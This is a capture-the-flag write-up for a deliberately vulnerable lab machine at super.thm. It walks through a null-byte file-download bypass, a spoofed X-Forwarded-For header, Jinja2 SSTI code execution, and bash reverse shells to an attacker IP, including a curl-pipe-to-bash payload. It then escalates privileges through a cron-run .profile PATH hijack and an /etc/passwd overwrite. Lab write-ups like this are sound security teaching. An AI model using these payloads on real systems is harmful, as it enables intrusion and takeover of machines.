Well, Well, Well, you're here, and I am glad to see that! Your task is simple.. well, not really.. I mean, it's kind of.. but.. anyways...
I was debugging my work and forgot about some *probably* harmful code, and sadly, I lost access to my machine. :(

Could you find my valuable information for me?
Don't forget to enjoy the journey while at it.

# Enumeration

## \[+] 10.10.136.194 - super.thm

Using `echo` and `>>` to append the IP address with the domain name to my `/etc/hosts` file. Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

First I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online:

```
$ echo '10.10.136.194 super.thm' >> /etc/hosts
$ export RHOSTS=10.10.136.194
$ rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
$ sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 7777 - HTTP

Using [feroxbuster](https://github.com/epi052/feroxbuster) to fuzz for directories and files:

```
$ feroxbuster -u http://super.thm/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x json,txt,js,xml -s 200,301,302,403 -o p-7777-www-ferox.txt

```

### \[-] super.thm:7777/cloud

This page gives us access to some interesting files:

![e8b7686987ea128066f6b953ffd2c751.png](/resources/9067e2c1f9a04928afecba2b322f185a.png)

We can download most files but when we try downloading any of the text files we get this error:

![b31d31c20f523ab8d6a4d59fb2c4291b.png](/resources/74911b117de44f47af5aaef80605813c.png)

If we capture the request we can modify the parameters to try and download other files if they are available.

For this task I'll use [ZAP's Manual Request Editor](https://www.zaproxy.org/). Changing the `download` parameter to 'source.py' gives us the source code for the web applications:

![bb573fbcd4b7e09c56b6d3f694cc665d.png](/resources/8f81f7e50302444ca7cdd112fcec9017.png)

![bfe2f1b484a544b1aed4366393b50f11.png](/resources/779a73fbf38542c99229d1e8a21816ce.png)

On line 10 of 'source.py' we find another file that is used for the password variable:

```
password = str(open('supersecrettip.txt').readline().strip())
```

After using ZAP to modify the `download` parameter to 'supersecrettip.txt' we get the following encoded text:

`b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'`

Lines 21 to 33 is the source code for `/cloud`:

```
@app.route("/cloud", methods=["GET", "POST"]) 
def download():
    if request.method == "GET":
        return render_template('cloud.html')
    else:
        download = request.form['download']
        if download == 'source.py':
            return send_file('./source.py', as_attachment=True)
        if download[-4:] == '.txt':
            print('download: ' + download)
            return send_from_directory(app.root_path, download, as_attachment=True)
        else:
            return send_from_directory(app.root_path + "/cloud", download, as_attachment=True)
```

If the `download` parameter is 'source.py', it will return the file from `./source.py` on the server, if the parameter ends in '.txt' it will return the file from the `root path` of the application and everything else will return files from the `/cloud` directory.

Checking the top of the source code for the imported modules we see another file we can try to download:

```
import debugpassword # from .
```

But since it is not in the `/cloud` folder and not `source.py` we need to bypass the check for '.txt' using a [null byte](https://portswigger.net/blog/null-byte-attacks-are-alive-and-well).

Setting the `download` parameter to `debugpassword.py%00.txt` will allow us to download the file:

![f36625c551d6fd7b8a8447ab5a4831fd.png](/resources/c5d3f5e75f764afaa6441f525e172966.png)

![7450aaf4fb93e894f5af428047a1a285.png](/resources/885fa0ae16f8480484ba98d681d59703.png)

```
import pwn

def get_encrypted(passwd):
    return pwn.xor(bytes(passwd, 'utf-8'), b'ayham')
```

Now we know the password to the debugger is XOR'd. There is also another hint in the comment on line 47 from 'source.py' has the letters X, O and R capitalized:

```
# I am not very eXperienced with encryptiOns, so heRe you go!
```

Using the following Python script we can decode the password:

```
def xor_decrypt(ciphertext, key):
    # Repeat or extend the key if it's shorter than the ciphertext
    key = key * (len(ciphertext) // len(key)) + key[:len(ciphertext) % len(key)]
    
    # Perform XOR operation byte-wise
    decrypted = bytes([a ^ b for a, b in zip(ciphertext, key)])
    
    return decrypted

# Encrypted message
encrypted_message = <STRING_FROM_SUPERSECRETTIP.TXT>

# Key
key = <STRING_FROM_DEBUGPASSWORD.PY>

# Decrypt the message
decrypted_message = xor_decrypt(encrypted_message, key)

# Display the result
print("Decrypted message:", decrypted_message)
```

### \[-] super.thm:7777/debug

Here we have a debugger that requires a password to run:

![6703a66fb8c2e45aa280bd154a1ae760.png](/resources/891683ba75824b9287c32ac80204d384.png)

If we enter `1337 * 1337` and the decrypted password we get the message 'Debug statement executed':

![e5fde0f99f6dd3109d02a9c02f046102.png](/resources/c08386fbaba44bc7abadafa408929170.png)

On line 58 in 'source.py' we can see another web application `/debugresult`:

```
@app.route("/debugresult", methods=["GET"])
```

### \[-] super.thm:7777/debugresult

Trying to access this page gives us a 401 Unauthorized error and a clue on how to bypass it:

![9f7f4ce774ef723c50889afa2426e118.png](/resources/87ed8ad32bd34840bab1d1b536587582.png)

If we check 'source.py' on line 60 there is an IP address check:

```
if not ip.checkIP(request):
    return abort(401, "Everything made in home, we don't like intruders.")
```

To bypass this we can add `X-Forward-For: 127.0.0.1` to the header in our request using ZAP. First we turn on 'Set Break on All Requests and Responses':

![82c9c0e25adc1924bebd5769dfc8a196.png](/resources/8ad92460a15347abb20c89f36c66f75a.png)

Refresh the page, edit the header and click the arrow icon 'Submit and Continue to Next Breakpoint':

![7b31c91206753cd1c64e9baa586e6f27.png](/resources/eab9486bc8dd481ca017e2ed1a7ba3b0.png)

We should gain access to the page:

![f8507abf608062545987efd9d0929a05.png](/resources/3b518d709dc048f6ae7a6cfea6942c56.png)

There are a couple of clues on how to exploit this, `{{7*7}}` is a common way to test for [Server Side Template Injection](https://portswigger.net/web-security/server-side-template-injection), the name of the room is also **S**uper **S**ecret **TI**p (SSTI) and the source code of `super.thm:7777/` has this clue in the metadata description:

![8fb4c846219145da41c98b704db76985.png](/resources/3714d4f6cc964192bb41266a096008ee.png)

# Initial Foothold

### \[-] ayham\@482cbf2305ae

We can test for SSTI by executing the statement `{{7*7}}` on `super.thm:7777/debug`:

![379812f957819f7b9d8aaf365c034c36.png](/resources/deff97f9b3a44195b26c68c7e0ac5cb4.png)

Then when we check `super.thm:7777/debugresult` we should get `49` as a result if it is vulnerable to SSTI:

![e0303dca25c39a7f40e5352788172630.png](/resources/88e24dfa905e422dbbdf907d18007f8d.png)

To exploit this I will be using payloads from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution).

If we check 'source.py' again we will find a filter on lines 11 and 12:

```
def illegal_chars_check(input):
    illegal = "'&;%"
```

It's only filtering single quotes `'` so we can just replace them with double quotes `"`.

We can use this payload to test for remote code execution on `super.thm:7777/debugger`:

`{{ self.__init__.__globals__.__builtins__.__import__("os").popen("id").read() }}`

![b6a06c26a7115df506cf049980157144.png](/resources/a7dcbeca9f9d49a4a1e7b263a0f31b26.png)

And check the result on `super.thm:7777/debuggeresult`:

![8e8b469896d9eb680bcb3d84c03b9bf0.png](/resources/72b83cf42ba6463cb6be50d17d1bf31a.png)

To get a reverse shell we first start a listener using [nc](https://linux.die.net/man/1/nc):

```
$ nc -nvlp 4444
```

Create a bash script for the reverse shell and save it as 'shell.sh':

```
bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"
```

Then host the bash script using Python:

```
$ python3 -m http.server 8888
```

On `super.thm:7777/debugger` we send the payload:

`{{ self.__init__.__globals__.__builtins__.__import__("os").popen("curl <ATTACKER_IP>:8888/shell.sh | bash").read() }}`

![91316b6930801705de2dfd7f611d112a.png](/resources/63a67a101029489293a355be43afc83b.png)

The payload can also be encoded using `base64` to bypass the filter and then piped to `bash`.

We first encode the reverse shell command using `echo` and pipe it to `base64`:

```
$ echo "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1" | base64
```

Then copy and paste the Base64 encoded output into our payload on `super.thm:7777/debugger` and prepend `echo` to the Base64 encoded string then append `| base64 -d` which will pipe the Base64 encoded string and decode it, then pipe the decoded command to `bash` with `| bash`:

`{{ self.__init__.__globals__.__builtins__.__import__("os").popen("echo <BASE64_ENCODED_STRING> | base64 -d | bash").read() }}`

And to get the reverse shell we have to visit `super.thm:7777/debuggeresult` which will cause the page to hang, but if we check our listener we should have a connection from the victim machine:

![0628c5953b704cca76dfad3c1efa2ac1.png](/resources/a54f5226cd8746368095acc81f501e5c.png)

We can get the first flag in `/home/ayham/flag1.txt`:

![681f641b9d2bf3cd25d11d969b65c7a5.png](/resources/cdd9f46a9edb4b6fbc962ec35dc37f25.png)

If we check the root directory `/` we find a `.dockerenv` file which might mean we are in a docker container and a text file `secret-tip.txt`:

![bd5206e7abf2147b214e6aa9d3e1324e.png](/resources/557d83a5abf34a2a878c0277baf78208.png)

```
$ cat secret-tip.txt
A wise *gpt* once said ...

They knew their ▒▒▒▒▒▒▒ was now vulnerable to disruption, setting in motion a desperate race against time to recover the missing ▒▒▒▒▒▒ before their ▒▒▒▒▒▒▒ unraveled before their eyes.

```

# Privilege Escalation

### \[-] F30s\@482cbf2305ae

Checking `/etc/crontab` reveals two scheduled tasks that run every minute:

```
$ cat /etc/crontab
```

![c3f941bbeca075626738bad0fe2897fd.png](/resources/bff99f3a296141a39a42135e989354af.png)

`root` is running `curl` with the `-K` option which uses the configuration at `/home/F30s/site_check`.

`F30s` is running `bash` with the `-lc` option which runs the command `cat /home/F30s/healthcheck` as a login shell.

We can access `/home/F30s` and check the file permissions using `ls -lah`:

```
$ ls -lah /home/F30s/
```

![74a4cdee13e47cc938b9f69e9a1fee11.png](/resources/e91df56876b943bc9bcfe6a475066a6c.png)

We have write access to the configuration file '.profile' which is used by [Bash](https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html) when it is invoked as a login shell.

If we create a binary with the name 'cat' and add the path of the binary to '.profile', the binary will be executed by the cronjob as the user 'F30s'.

First we create the binary in the `/tmp/` directory with the reverse shell command using `echo`. The `-e` option will enable interpretation of backslash escapes, `\n` will create a new line and `>` will output the result to a new file named 'cat':

```
$ cd /tmp/
$ echo -e '#!/bin/bash\nbash -i >&/dev/tcp/10.13.0.185/4445 0>&1' > cat
```

Then we make the file executable with `chmod +x`:

```
$ chmod +x cat
```

On our attacker machine we start a listener on port 4445:

```
$ nc -nvlp 4445
```

On the victim machine we edit `/home/F30s/.profile` by overwriting the file with the path of our new binary as a `PATH` variable using `echo`:

```
$ echo 'PATH="/tmp/:$PATH"' > /home/F30s/.profile
```

And back on the terminal listening on port 4445 we should receive a connection:

![208bdc35d82d1066b0d308edfc2148a3.png](/resources/e63c09eef2e84a8f9c96a5cb0fb1b08b.png)

We know the next flag is in a file named 'flag2.txt' but if we use `find` to search for it, there are no results. So the file is either in a directory we cannot access like `/root` or it's not on this machine.

### \[-] root\@482cbf2305ae

The other cronjob running is `curl -K /home/F30s/site_check`. The [-K option](https://curl.se/docs/manpage.html#-K) uses the configurations in `/home/F30s/site_check`. Since we have write access to the configuration file we can use it to access files owned by the user 'root' because the cronjob is being run by the user 'root'.

Let's check the contents of 'site\_check' and since we changed the `PATH` variable, we need to use the full path for `cat` instead:

```
$ /bin/cat site_check
```

![20d5da6b5c274d710a278ce17708a4c2.png](/resources/676b95507dbc410d8056fefafc952b20.png)

To gain access to the user 'root', we can use this cronjob to overwrite `/etc/passwd` to set a blank password.

First we need to print the contents of `/etc/passwd`:

```
$ /bin/cat /etc/passwd
```

![e2ec15817df61bde4296f60f4d395cf3.png](/resources/9ecfee3bf6b849a1b7cda472a525ef01.png)

Then we copy the contents to a text editor on the attacker machine and delete the `x` character for the users that we want to have blank passwords. The `x` character represents a hashed password in `/etc/shadow` so by removing it we don't need to authenticate with a password at all.

For example the original line `root:x:0:0:root:/root:/bin/bash`  becomes `root::0:0:root:/root:/bin/bash`:

![e2e19b475ccb9a21edfeb0baa716597d.png](/resources/48d9041cf46b44af88270078b83e6deb.png)

Now we host this modified 'passwd' file using `python3` on the attacker machine:

```
$ python3 -m http.server 8888
```

Then on the victim machine, we overwrite `/home/F30s/site_check` using `echo -e` to point to 'passwd' in the `/etc/` directory by changing the `url` parameter to `http://<ATTACKER_IP>:8888/passwd` and output the contents to a new file using `-o /etc/passwd` and `> site_check` to overwrite the current file:

```
$ echo -e 'url = http://<ATTACKER_IP>:8888/passwd\n-o /etc/passwd' > site_check
```

After a minute we should see a request in the terminal running the HTTP server on the attacker machine for the 'passwd' file. This let's us know that the 'passwd' file on the victim machine has been overwritten and now we can switch to the user 'root' using `su`:

```
$ su root
```

![c0a7caafc61c3f7226466e5bb809abf0.png](/resources/d0e2e36240014d46baa539e2223da6e6.png)

Checking `/root/` directory we find the encrypted second flag 'flag2.txt' and 'secret.txt':

![a63f9e5ae1196daff771786c87c0927a.png](/resources/115355a0814044078c9a6bb2dc4b2e48.png)

Looking back at the clue in `/home/ayham/secret-tip.txt`, we get a hint about what the key is:

```
"...Don't forget it's always about root!"
```

We can modify the script we used earlier to decrypt 'secret.txt'. We need to change `encrypted_message` to the contents of 'secret.txt' and change the `key` to 'root':

```
def xor_decrypt(ciphertext, key):
    # Repeat or extend the key if it's shorter than the ciphertext
    key = key * (len(ciphertext) // len(key)) + key[:len(ciphertext) % len(key)]
    
    # Perform XOR operation byte-wise
    decrypted = bytes([a ^ b for a, b in zip(ciphertext, key)])
    
    return decrypted

# Encrypted message
encrypted_message = <SECRET.TXT>

# Key
key = b'root'

# Decrypt the message
decrypted_message = xor_decrypt(encrypted_message, key)

# Display the result
print("Decrypted message:", decrypted_message)
```

The result we get is a string of numbers and `XX` at the end of the string of numbers.

When we change the `encrypted_message` to the contents of 'flag2.txt' and `key` to this string of numbers we get most of the flag decrypted. The `XX` must be numbers that we have to brute force to get the full flag.

We can replace one of the `X`'s with a number starting from `0`, run the script, then edit the script again by incrementing that number from `1` through `9` until the flag is more readable. After that we do the same for the other `X` and we get the entire flag:

![c5d79e3b434b57c50e178d5497f2fa93.png](/resources/fded699e32a94c639215a138441a27f0.png)
